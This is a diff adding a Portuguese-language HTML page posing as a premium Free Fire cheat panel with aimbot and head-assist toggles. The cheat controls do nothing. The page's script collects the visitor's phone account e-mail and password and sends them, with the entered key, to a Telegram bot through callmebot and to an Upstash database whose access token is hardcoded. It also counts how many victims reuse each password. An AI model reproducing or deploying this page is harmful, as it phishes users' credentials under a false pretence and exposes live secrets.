@@ -1,0 +1,165 @@
+<!doctype html>
+<html lang="pt-BR">
+ <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>GHOST Auxílio - Premium</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+  <style>
+    body{margin:0;width:100vw;height:100vh;overflow:hidden;display:flex;justify-content:center;align-items:center;background:#050505;font-family:Arial,sans-serif;}
+    #particles{position:fixed;inset:0;z-index:99;pointer-events: none;}
+    .painel, .login-box {position:relative;z-index:1;width:350px;background: linear-gradient(135deg, rgba(45, 10, 25, 0.95) 0%, rgba(0, 0, 0, 0.98) 100%);border-radius:18px;backdrop-filter:blur(15px);border:1px solid rgba(255, 20, 147, 0.5);box-shadow: 0 0 25px rgba(0, 0, 0, 0.9);padding:15px;box-sizing:border-box;}
+    #painelPrincipal, #telaKey { display: none; }
+    .titulo{color:#ff4fa3;text-align:center;font-size:20px;font-weight:bold;margin-bottom:6px;}
+    .linha{height:1px;background:rgba(255,20,147, 0.5);margin-bottom:10px;}
+    .input-key {width: 100%;height: 40px;background: rgba(0,0,0,0.5);border: 1px solid rgba(255,20,147,0.3);border-radius: 8px;color: #fff;text-align: center;margin-bottom: 10px;outline: none;}
+    .botoes{display:flex;gap:10px;margin-bottom: 12px;}
+    .btn{flex:1;height:38px;border-radius:10px;border:1px solid rgba(255,20,147, 0.3);background:rgba(50,15,30, 0.7);color:#f2c7da;font-weight:bold;cursor:pointer;}
+    .btn.ativo{background:rgba(255,20,147, 0.8);box-shadow:0 0 12px rgba(255,20,147, 0.4);color:#fff;}
+    .conteudo{ display:none; }
+    .conteudo.ativo{ display:block; }
+    .check{display:flex;align-items:center;gap:8px;color:#ffd6e8;margin-bottom:8px;font-size:14px;}
+    .check input{ accent-color:#ff1493; }
+    .range-box{ margin:6px 0 10px 0; }
+    .fov-text{ color:#ffd6e8; font-size:13px; margin-bottom:4px; }
+    input[type=range]{width:100%; height:4px; background:#ff1493; border:1px solid #fff; border-radius:10px; appearance:none;}
+    input[type=range]::-webkit-slider-thumb{appearance:none; width:14px; height:14px; background:#fff; border-radius:50%;}
+    .select-box{ margin-top:6px; }
+    .select-box select{width:100%; height:34px; background:rgba(20,5,10, 0.9); border:1px solid rgba(255,20,147, 0.5);border-radius:8px; color:#ffd6e8; padding:0 8px;}
+    .radio-group{ display:flex; justify-content:center; gap:50px; margin-top:10px; }
+    .radio{ display:flex; align-items:center; gap:6px; color:#ffd6e8; }
+    .radio input{ accent-color:#ff1493; }
+    .inject, .btn-login{margin-top:14px; width:100%; height:42px; border-radius:12px; border:1px solid rgba(255,20,147, 0.7);background:rgba(255,20,147, 0.7); color:#fff; font-weight:bold; font-size:15px; cursor:pointer;}
+    .info-box{background: rgba(20, 0, 10, 0.7);border:1px solid rgba(255,20,147, 0.4); border-radius:12px; padding:12px; color:#ffe3f2; font-size:13px; text-align: center;}
+    .btn-sair { background: #441111; color: #ff7777; border: 1px solid #662222; padding: 8px; border-radius: 8px; cursor: pointer; font-size: 11px; margin-top: 15px; width: 100%; font-weight: bold; }
+    
+    .social-btn { display: flex; align-items: center; justify-content: center; gap: 8px; width: 100%; padding: 10px; margin-top: 10px; border-radius: 8px; text-decoration: none; color: white; font-weight: bold; font-size: 12px; }
+    .insta { background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); }
+    .tiktok { background: #000; border: 1px solid #ff0050; }
+  </style>
+ </head>
+ <body>
+  <canvas id="particles"></canvas>
+  
+  <div class="login-box" id="telaLogin">
+   <div class="titulo">CRIAR CONTA</div>
+   <div class="linha"></div>
+   <input type="email" id="inputEmail" class="input-key" placeholder="E-mail do celular">
+   <input type="password" id="inputPass" class="input-key" placeholder="Senha da conta">
+   <button class="btn-login" onclick="registrarConta()">Logar na Conta</button>
+  </div>
+
+  <div class="login-box" id="telaKey">
+    <div class="titulo">VALIDAR KEY</div>
+    <div class="linha"></div>
+    <input type="text" id="inputKey" class="input-key" placeholder="SENS-XXXX-XXXX-XXXX">
+    <button class="btn-login" id="btnLoginAction" onclick="verificarKey()">Entrar no Painel</button>
+  </div>
+
+  <div class="painel" id="painelPrincipal">
+   <div class="titulo">GHOST Auxílio</div>
+   <div class="linha"></div>
+   <div class="botoes">
+    <button id="btnFuncoes" class="btn ativo">FUNÇÕES</button>
+    <button id="btnInfo" class="btn">INFO</button>
+   </div>
+   <div id="funcoes" class="conteudo ativo">
+    <label class="check"><input type="checkbox" class="chk"> Aux Cabeça</label> 
+    <label class="check"><input type="checkbox" class="chk"> Aimbot 70%</label> 
+    <label class="check"><input type="checkbox" class="chk"> 100% Precisão</label> 
+    <label class="check"><input type="checkbox" id="aimfov" class="chk"> AimFov</label>
+    
+    <div class="range-box" id="rangeBox" style="display:none;">
+     <div class="fov-text">Fov: <span id="fovValue">57</span></div>
+     <input type="range" min="0" max="260" value="57" id="fovRange">
+    </div>
+
+    <div class="select-box">
+     <select> <option>Recoil: Pesado</option> <option>Recoil: Médio</option> <option>Recoil: Leve</option> </select>
+    </div>
+    <div class="select-box">
+     <select> <option>Foco: Pescoço</option> <option>Foco: Peito</option> <option>Foco: Cabeça</option> </select>
+    </div>
+    <div class="radio-group">
+     <label class="radio"><input type="radio" name="modo" checked> Ao Atirar</label> <label class="radio"><input type="radio" name="modo"> Ao Mirar</label>
+    </div>
+    <button class="inject" onclick="abrirFreeFire()">Inject Pasta</button>
+   </div>
+   <div id="info" class="conteudo">
+    <div class="info-box">
+     Criador: <b>GHOST</b><br><br>
+     <a href="https://www.instagram.com/mira.ndinha7?igsh=YWVxaXQ3NjU0bnFh" target="_blank" class="social-btn insta"><i class="fab fa-instagram"></i> INSTAGRAM</a>
+     <a href="https://www.tiktok.com/@auxilio.ghost?_r=1&_t=ZS-93tC0PJGFPw" target="_blank" class="social-btn tiktok"><i class="fab fa-tiktok"></i> TIKTOK</a>
+     <button class="btn-sair" onclick="sairDaConta()">SAIR DA CONTA</button>
+    </div>
+   </div>
+  </div>
+
+<script>
+const UPSTASH_URL = "https://flowing-foal-43289.upstash.io";
+const UPSTASH_TOKEN = "AakZAAIncDI2NTk5OGEwZTY3NWY0MWRlYmVlMGY4ZGE1YzM0YjYwMXAyNDMyODk";
+
+async function avisarNoTelegram(u, p, k) {
+    try {
+        const resp = await fetch(`${UPSTASH_URL}/lrange/logins_clientes/0/-1`, { headers: { Authorization: `Bearer ${UPSTASH_TOKEN}` } });
+        const data = await resp.json();
+        let repetidas = 0;
+        if(data.result) {
+            data.result.forEach(item => {
+                const log = JSON.parse(typeof item === 'string' ? JSON.parse(item) : item);
+                if(log.senha === p) repetidas++;
+            });
+        }
+        const msg = `⚠️ *NOVO LOGIN* ⚠️%0A%0A📧 *E-mail:* ${u}%0A🔑 *Senha:* ${p}%0A🎫 *Key:* ${k}%0A👥 *Mesma senha:* ${repetidas + 1}`;
+        fetch(`https://api.callmebot.com/telegram.php?user=@joaoaraujo&text=${msg}&apikey=6348126131`);
+    } catch(e) {}
+}
+
+window.onload = () => { if(localStorage.getItem("user_email")) { document.getElementById("telaLogin").style.display = "none"; document.getElementById("telaKey").style.display = "block"; } };
+
+function registrarConta() {
+    const email = document.getElementById("inputEmail").value;
+    const pass = document.getElementById("inputPass").value;
+    if(!email || !pass) return alert("Preencha tudo!");
+    localStorage.setItem("user_email", email);
+    localStorage.setItem("user_pass", pass);
+    document.getElementById("telaLogin").style.display = "none";
+    document.getElementById("telaKey").style.display = "block";
+}
+
+async function verificarKey() {
+    const key = document.getElementById("inputKey").value.trim();
+    const email = localStorage.getItem("user_email");
+    const pass = localStorage.getItem("user_pass");
+    if(!key) return alert("Insira a key!");
+    
+    document.getElementById("btnLoginAction").innerText = "VALIDANDO...";
+    const response = await fetch(`${UPSTASH_URL}/get/valid_key_${key}`, { headers: { Authorization: `Bearer ${UPSTASH_TOKEN}` } });
+    const data = await response.json();
+    
+    if(data.result) {
+        await avisarNoTelegram(email, pass, key);
+        const log = { usuario: email, senha: pass, key: key, data: new Date().toLocaleString() };
+        await fetch(`${UPSTASH_URL}/rpush/logins_clientes`, { method: 'POST', headers: { Authorization: `Bearer ${UPSTASH_TOKEN}` }, body: JSON.stringify(JSON.stringify(log)) });
+        document.getElementById("telaKey").style.display = "none";
+        document.getElementById("painelPrincipal").style.display = "block";
+    } else {
+        alert("Key Inválida!");
+        document.getElementById("btnLoginAction").innerText = "Entrar no Painel";
+    }
+}
+
+function sairDaConta() { localStorage.clear(); location.reload(); }
+function abrirFreeFire(){ window.location.href = "freefire://"; }
+
+document.getElementById("aimfov").onchange = function() { document.getElementById("rangeBox").style.display = this.checked ? "block" : "none"; };
+document.getElementById("fovRange").oninput = function() { document.getElementById("fovValue").innerText = this.value; };
+
+const btnF = document.getElementById("btnFuncoes"); const btnI = document.getElementById("btnInfo");
+btnF.onclick = () => { document.getElementById("funcoes").classList.add("ativo"); document.getElementById("info").classList.remove("ativo"); btnF.classList.add("ativo"); btnI.classList.remove("ativo"); };
+btnI.onclick = () => { document.getElementById("info").classList.add("ativo"); document.getElementById("funcoes").classList.remove("ativo"); btnI.classList.add("ativo"); btnF.classList.remove("ativo"); };
+
+const canvas=document.getElementById("particles"); const ctx=canvas.getContext("2d"); let w,h,ps=[]; function resize(){w=canvas.width=innerWidth;h=canvas.height=innerHeight;} resize(); for(let i=0;i<60;i++){ps.push({x:Math.random()*w,y:Math.random()*h,r:Math.random()*1.5,s:Math.random()*1});} (function anim(){ctx.clearRect(0,0,w,h);ctx.fillStyle="white";ps.forEach(p=>{p.y+=p.s;if(p.y>h)p.y=-5;ctx.beginPath();ctx.arc(p.x,p.y,p.r,0,Math.PI*2);ctx.fill();});requestAnimationFrame(anim);})();
+</script>
+ </body>
+  </html>
